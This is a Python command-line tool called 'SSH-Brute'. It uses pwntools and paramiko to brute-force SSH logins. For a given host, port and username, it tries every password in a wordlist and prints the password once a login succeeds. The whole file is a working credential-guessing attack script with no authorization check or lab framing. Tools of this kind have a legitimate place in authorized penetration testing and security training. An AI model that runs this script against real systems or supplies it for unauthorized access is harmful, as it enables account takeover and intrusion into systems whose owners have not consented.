import sys
from pwn import *
import paramiko

# References:
#     https://docs.paramiko.org/en/latest/api/auth.html
#     https://docs.pwntools.com/en/stable/tubes/ssh.html
#     https://docs.paramiko.org/en/latest/api/ssh_exception.html#paramiko.ssh_exception.SSHException

# Help Function to describe arguments of the tool
def print_help():
    help_text = """
    SSH-Brute Help Section:
    Usage: python script_name.py [options]

    Options:
    -h                Display this help message
    -p <port>         Specify the SSH port (default: 22)
    -u <username>     Specify the SSH username
    -f <password_file> Specify the password list file
    -t <hostname>     Specify the IP address of target system
    
    Example:
    python script_name.py -u admin -p 2222 -f custom-password-list.txt -t 192.168.0.123
    """
    print(help_text)

if "-h" in sys.argv:
    print_help()
    sys.exit()

print("Welcome to SSH-Brute!")

# If no arguments are provided. Refer to the help section
if len(sys.argv) < 2:
    print("Press -h for the help section")
    sys.exit()

# Default Values
attempts = 0
port = 22

# Parse command-line arguments with validation
if "-u" in sys.argv:
    username = sys.argv[sys.argv.index("-u") + 1]
else:
    print("Error: Username is required. Use -u to specify the username.")
    sys.exit(1)

if "-p" in sys.argv:
    port = int(sys.argv[sys.argv.index("-p") + 1])

if "-f" in sys.argv:
    password_file = sys.argv[sys.argv.index("-f") + 1]
else:
    print("Error: Password file is required. Use -f to specify the password file.")
    sys.exit(1)

if "-t" in sys.argv:
    host = sys.argv[sys.argv.index("-t") + 1]
else:
    print("Error: Hostname is required. Use -t to specify the target hostname.")
    sys.exit(1)

# Print the final values 
print("User: {}".format(username))
print("Hostname: {}".format(host))
print("Port: {}".format(port))
print("Wordlist: {}".format(password_file))

try:
    # Open the Password File
    with open(password_file, "r") as password_list:
        for password in password_list: # Iterate through the password list
            password = password.strip("\n") # Strip the newlines in the password list
            try:
                print("[{}] Attempting password: '{}'!".format(attempts, password))
                response = ssh(host=host, user=username, password=password, port=port, timeout=2) # Login via SSH
                # If connection is established
                if response.connected():
                    print("[>] Valid password found: '{}'".format(password))
                    response.close() # Close the connection
                    break # Break the loop if valid password is found
                response.close()

            except paramiko.ssh_exception.AuthenticationException: #Invalid Password Exception
                print("[X] Invalid password!")
            except paramiko.ssh_exception.SSHException as e: #SSH Related Exception along with error message
                print("[!] SSHException: {}".format(str(e)))
            except EOFError as eof_error:
                print("[!] EOFError: {}".format(str(eof_error))) #End of File Exception along with error message
            except Exception as ex:
                print("[!] General Exception: {}".format(str(ex)))
            attempts += 1 # Incrementing attempts

except KeyboardInterrupt: #Handle KeyboardInterrupt like pressing Ctrl+C
    print("\n[!] Process interrupted by user. Exiting...")
    sys.exit(0)
